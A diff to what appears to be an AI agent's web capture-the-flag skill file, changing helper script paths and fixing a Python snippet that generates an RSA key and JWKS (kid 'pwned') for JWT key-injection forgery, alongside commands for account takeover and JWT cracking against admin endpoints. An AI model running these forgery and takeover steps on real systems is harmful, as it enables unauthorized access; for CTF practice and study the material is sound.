@@ -25,7 +25,7 @@ activation or token consumption clears only that later state, not the original f
 When you know a pre-provisioned identity and can obtain its auth artifact, run the bounded helper:
 
 ```bash
-python3 ~/.claude/skills/web-ctf/scripts/authquick.py --base <target> \
+python3 ~/.codex/skills/web-ctf/scripts/authquick.py --base <target> \
   --account 'executive@example.test=Executive Name' --password '<chosen-password>' \
   --register-field 'username=<required-value>' --objective-path /api/protected/action
 ```
@@ -93,7 +93,7 @@ list means the secret is exotic** — plain common words are still a common auth
 that's exactly what the second stage is for, not an unlikely-to-pay-off escape hatch.
 
 ```bash
-python3 ~/.claude/skills/web-ctf/scripts/jwtquick.py --token "$TOKEN" \
+python3 ~/.codex/skills/web-ctf/scripts/jwtquick.py --token "$TOKEN" \
   --base <target> --test /api/admin/stats
 ```
 
@@ -178,7 +178,8 @@ python3 << 'EOF'
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 import json, base64, os
-os.makedirs('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits', exist_ok=True)
+exploit_dir = os.path.expanduser('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits')
+os.makedirs(exploit_dir, exist_ok=True)
 private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 pub = private_key.public_key().public_numbers()
 def b64u(n):
@@ -186,10 +187,10 @@ def b64u(n):
     return base64.urlsafe_b64encode(n.to_bytes(l,'big')).rstrip(b'=').decode()
 kid = "pwned"
 jwks = {"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":kid,"n":b64u(pub.n),"e":b64u(pub.e)}]}
-open('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/private_key.pem','wb').write(
+open(os.path.join(exploit_dir, 'private_key.pem'),'wb').write(
     private_key.private_bytes(serialization.Encoding.PEM,
         serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
-json.dump(jwks, open('~/Offsec/Web_CTF/CTF/<challenge-name>/exploits/jwks.json','w'))
+json.dump(jwks, open(os.path.join(exploit_dir, 'jwks.json'),'w'))
 print("Done. KID:", kid)
 EOF
 ```
